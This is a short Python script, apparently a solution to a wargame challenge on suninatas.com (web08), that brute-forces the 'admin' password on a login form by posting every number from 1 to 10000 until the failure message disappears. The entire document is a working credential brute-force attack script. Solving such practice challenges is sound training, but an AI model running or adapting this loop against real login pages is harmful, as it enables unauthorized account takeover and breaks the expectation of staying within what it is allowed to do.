import requests
url = "http://suninatas.com/challenge/web08/web08.asp"

for i in range(1,10001):
    r = requests.post(url,data={"id" : "admin", "pw" : f"{i}"})
    if "Password Incorrect!" not in r.text:
        print(r.text)
        print(f"password is {i}")
        break
    else:
        print(f"{i} is not password..")
